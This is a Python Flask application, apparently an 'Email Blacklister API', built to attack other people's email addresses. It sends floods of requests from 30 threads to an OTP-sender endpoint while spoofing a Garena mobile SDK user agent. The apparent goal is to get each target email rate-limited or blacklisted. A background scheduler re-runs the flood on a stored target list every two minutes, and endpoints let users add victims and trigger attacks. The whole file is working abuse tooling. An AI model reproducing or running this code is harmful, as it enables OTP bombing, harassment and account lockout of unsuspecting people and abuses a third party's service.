import os
import time
import threading
import requests
import urllib3
import json
from datetime import datetime
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NUM_WORKERS = 30
AUTO_INTERVAL_MINUTES = 2
AUTO_EMAILS_FILE = "auto_emails.json"
RESULTS_FILE = "blacklist_results.json"

app = Flask(__name__)

auto_emails_list = []
results_history = []
any_success = False
any_success_lock = threading.Lock()
error_event = threading.Event()
stop_event = threading.Event()
error_print_lock = threading.Lock()
generation = 0


def load_auto_emails():
    global auto_emails_list
    try:
        if os.path.exists(AUTO_EMAILS_FILE):
            with open(AUTO_EMAILS_FILE, 'r') as f:
                auto_emails_list = json.load(f)
        else:
            auto_emails_list = []
            save_auto_emails()
        print("[+] Loaded " + str(len(auto_emails_list)) + " emails: " + str(auto_emails_list))
    except Exception as e:
        print("[!] Load error: " + str(e))
        auto_emails_list = []


def save_auto_emails():
    try:
        with open(AUTO_EMAILS_FILE, 'w') as f:
            json.dump(auto_emails_list, f, indent=4)
    except Exception as e:
        print("[!] Save error: " + str(e))


def save_results():
    try:
        with open(RESULTS_FILE, 'w') as f:
            json.dump(results_history[-500:], f, indent=4)
    except Exception as e:
        print("[!] Save results error: " + str(e))


def worker(email, gen):
    global any_success
    while not stop_event.is_set():
        if gen != generation:
            return
        url = "https://swap-otp-sender.vercel.app/send"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {
            "app_id": "100067",
            "email": email,
            "locale": "en_HK"
        }
        try:
            resp = requests.post(url, headers=headers, data=data, timeout=15, verify=False)
            if resp.status_code == 200:
                with any_success_lock:
                    any_success = True
            else:
                with error_print_lock:
                    if not error_event.is_set():
                        error_event.set()
                        stop_event.set()
                return
        except Exception:
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    stop_event.set()
            return


def blacklist_email(email):
    global any_success, error_event, stop_event, generation
    generation += 1
    any_success = False
    error_event.clear()
    stop_event.clear()
    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(email, generation))
        t.daemon = True
        t.start()
        threads.append(t)
    stop_event.wait(timeout=20)
    for t in threads:
        t.join(timeout=2)
    if error_event.is_set():
        if not any_success:
            return False, "EMAIL ALREADY BLACKLISTED"
        else:
            return True, "EMAIL BLACKLISTED SUCCESSFULLY"
    return False, "UNKNOWN ERROR OCCURRED"


def run_auto_blacklist():
    if not auto_emails_list:
        print("[" + datetime.now().strftime('%H:%M:%S') + "] Auto list empty, skipping...")
        return
    print("=" * 60)
    print("[" + datetime.now().strftime('%H:%M:%S') + "] AUTO BLACKLIST STARTED")
    print("[+] Total emails: " + str(len(auto_emails_list)))
    print("=" * 60)
    summary = {"success": 0, "failed": 0, "skipped": 0, "total": len(auto_emails_list)}
    emails_copy = list(auto_emails_list)
    for email in emails_copy:
        print("[>] Processing: " + email)
        success, msg = blacklist_email(email)
        record = {
            "email": email,
            "success": success,
            "message": msg,
            "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        results_history.append(record)
        save_results()
        if success:
            summary["success"] += 1
            print("[OK] SUCCESS: " + email)
        elif "ALREADY" in msg:
            summary["skipped"] += 1
            print("[!] SKIPPED: " + email)
        else:
            summary["failed"] += 1
            print("[X] FAILED: " + email)
        time.sleep(2)
    print("[+] AUTO BLACKLIST COMPLETE: " + str(summary))
    print("=" * 60)


def auto_scheduler():
    print("[+] Auto scheduler started (every " + str(AUTO_INTERVAL_MINUTES) + " minute)")
    time.sleep(10)
    while True:
        try:
            run_auto_blacklist()
        except Exception as e:
            print("[!] Auto job error: " + str(e))
        print("[+] Next auto-run in " + str(AUTO_INTERVAL_MINUTES) + " minute(s)...")
        time.sleep(AUTO_INTERVAL_MINUTES * 60)


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "service": "Email Blacklister API",
        "interval": str(AUTO_INTERVAL_MINUTES) + " minutes",
        "total_emails": len(auto_emails_list),
        "total_results": len(results_history),
        "emails": auto_emails_list
    })


@app.route('/blacklist', methods=['POST'])
def api_blacklist():
    data = request.get_json() or {}
    email = data.get('email', '').strip()
    if not email or '@' not in email or '.' not in email:
        return jsonify({"success": False, "error": "Invalid email"}), 400
    print("[API] Blacklisting now: " + email)
    success, msg = blacklist_email(email)
    record = {
        "email": email,
        "success": success,
        "message": msg,
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "source": "api"
    }
    results_history.append(record)
    save_results()
    return jsonify({
        "success": success,
        "email": email,
        "message": msg,
        "time": record["time"]
    })


@app.route('/add', methods=['POST'])
def api_add():
    data = request.get_json() or {}
    emails = data.get('emails', [])
    if isinstance(emails, str):
        emails = [e.strip() for e in emails.split(',') if e.strip()]
    added, invalid, exists = [], [], []
    for email in emails:
        if not email or '@' not in email or '.' not in email:
            invalid.append(email)
        elif email in auto_emails_list:
            exists.append(email)
        else:
            auto_emails_list.append(email)
            added.append(email)
    save_auto_emails()
    return jsonify({
        "success": True,
        "added": added,
        "already_exists": exists,
        "invalid": invalid,
        "total_in_list": len(auto_emails_list)
    })


@app.route('/remove', methods=['POST'])
def api_remove():
    data = request.get_json() or {}
    emails = data.get('emails', [])
    if isinstance(emails, str):
        emails = [e.strip() for e in emails.split(',') if e.strip()]
    removed, not_found = [], []
    for email in emails:
        if email in auto_emails_list:
            auto_emails_list.remove(email)
            removed.append(email)
        else:
            not_found.append(email)
    save_auto_emails()
    return jsonify({
        "success": True,
        "removed": removed,
        "not_found": not_found,
        "total_in_list": len(auto_emails_list)
    })


@app.route('/list', methods=['GET'])
def api_list():
    return jsonify({
        "total": len(auto_emails_list),
        "emails": auto_emails_list,
        "interval_minutes": AUTO_INTERVAL_MINUTES
    })


@app.route('/results', methods=['GET'])
def api_results():
    limit = request.args.get('limit', default=50, type=int)
    return jsonify({
        "total": len(results_history),
        "results": results_history[-limit:]
    })


@app.route('/run-now', methods=['POST'])
def api_run_now():
    if not auto_emails_list:
        return jsonify({"success": False, "error": "Auto list is empty"}), 400
    t = threading.Thread(target=run_auto_blacklist, daemon=True)
    t.start()
    return jsonify({
        "success": True,
        "message": "Auto blacklist triggered in background",
        "total_emails": len(auto_emails_list)
    })


@app.route('/clear', methods=['DELETE'])
def api_clear():
    global auto_emails_list
    count = len(auto_emails_list)
    auto_emails_list.clear()
    save_auto_emails()
    return jsonify({
        "success": True,
        "cleared": count,
        "message": "Auto list cleared"
    })


def _start_background_jobs():
    try:
        load_auto_emails()
        scheduler_thread = threading.Thread(target=auto_scheduler, daemon=True)
        scheduler_thread.start()
        print("[+] Background scheduler started on import")
        print("[+] Auto blacklist will run every " + str(AUTO_INTERVAL_MINUTES) + " minutes")
    except Exception as e:
        print("[!] Failed to start scheduler: " + str(e))


_start_background_jobs()


if __name__ == '__main__':
    print("=" * 60)
    print("  EMAIL BLACKLISTER API")
    print("=" * 60)
    port = int(os.environ.get("PORT", 5000))
    print("[+] Server starting on http://0.0.0.0:" + str(port))
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)